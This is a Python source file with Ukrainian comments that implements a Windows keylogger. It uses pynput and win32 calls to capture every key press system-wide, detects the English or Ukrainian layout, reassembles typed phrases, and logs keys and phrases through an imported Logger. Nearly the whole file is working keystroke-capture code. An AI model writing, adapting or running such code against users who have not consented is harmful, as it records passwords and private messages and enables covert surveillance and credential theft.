from pynput import keyboard
from logger import Logger
from config import config
import win32api
import win32con
import ctypes

keyboard_layouts = {
    0x409: 'en',  # English (US)
    0x422: 'uk',  # Ukrainian
}


def get_current_language():
    """Функція для визначення поточної мови клавіатури (для Windows)."""
    hwnd = ctypes.windll.user32.GetForegroundWindow()
    thread_id = ctypes.windll.user32.GetWindowThreadProcessId(hwnd, 0)
    klid = win32api.GetKeyboardLayout(thread_id)
    return klid & (2 ** 16 - 1)


class Keylogger:
    def __init__(self):
        self.logger = Logger()
        self.current_phrase = []
        self.shift_pressed = False  # Перевірка натискання Shift
        self.current_lang = get_current_language()  # Збереження початкової розкладки

    def start(self):
        """Запуск логування клавіатури."""
        with keyboard.Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            listener.join()

    def on_press(self, key):
        """Логування натискання клавіші."""
        try:
            # Оновлюємо поточну розкладку перед кожним натисканням клавіші
            self.current_lang = get_current_language()

            # Ігноруємо спеціальні клавіші, окрім тих, що використовуються для зупинки
            if self.should_ignore_key(key):
                return

            # Обробка спеціальних клавіш для комбінацій
            if key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
                self.current_phrase.append("ctrl")
                return

            if key == keyboard.Key.shift or key == keyboard.Key.shift_r:
                self.current_phrase.append("shift")
                self.shift_pressed = True
                return

            # Обробляємо звичайні клавіші
            key_name = self.get_key_name(key)
            if key_name:
                if key_name == "Key.space":
                    self.current_phrase.append(" ")
                elif key_name == "Key.backspace":
                    if self.current_phrase:
                        self.current_phrase.pop()  # Вилучаємо останній символ
                else:
                    self.current_phrase.append(key_name)

            self.logger.log_event("key_press", {"key": key_name})

        except Exception as e:
            self.logger.log_event("error", {"message": str(e)})

    def on_release(self, key):
        """Обробка відпускання клавіші."""
        # Видаляємо Ctrl і Shift після відпускання
        if key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
            if "ctrl" in self.current_phrase:
                self.current_phrase.remove("ctrl")

        if key == keyboard.Key.shift or key == keyboard.Key.shift_r:
            self.shift_pressed = False
            if "shift" in self.current_phrase:
                self.current_phrase.remove("shift")

    def finish_phrase(self):
        """Фіксує завершену фразу і записує її до логу."""
        if self.current_phrase:
            phrase = ''.join(self.current_phrase).strip()
            if phrase:
                self.logger.log_event("phrase", {"phrase": phrase})
            self.current_phrase.clear()

    def get_key_name(self, key):
        """Отримання читабельної назви клавіші з підтримкою різних мов і спеціальних символів."""
        try:
            lang_code = keyboard_layouts.get(self.current_lang, 'en')  # За замовчуванням 'en'

            if hasattr(key, 'char') and key.char is not None:
                # Якщо натиснуто Shift, перевіряємо символ для спеціальних клавіш
                if self.shift_pressed and key.char.isdigit():
                    special_chars = {
                        '1': '!', '2': '@', '3': '#', '4': '$', '5': '%',
                        '6': '^', '7': '&', '8': '*', '9': '(', '0': ')'
                    }
                    return special_chars.get(key.char, key.char)

                return key.char
            else:
                # Фіксуємо спеціальні символи або коди, ігноруємо невідомі символи
                if key in [keyboard.Key.space, keyboard.Key.enter, keyboard.Key.backspace]:
                    return str(key)
                return None  # Ігнорування непотрібних або невідомих кодів
        except:
            return None

    def check_stop_combination(self):
        """Перевірка комбінації клавіш для зупинки програми."""
        stop_combination = ["ctrl", "shift", "q"]
        return all(key in self.current_phrase for key in stop_combination)

    def should_ignore_key(self, key):
        """Перевірка, чи слід ігнорувати комбінації клавіш для зміни мови або інших системних дій."""
        if isinstance(key, keyboard.Key):
            # Ігнорування Alt, Tab і комбінацій з ними
            if key in [keyboard.Key.alt_l, keyboard.Key.alt_r, keyboard.Key.tab]:
                return True
        return False

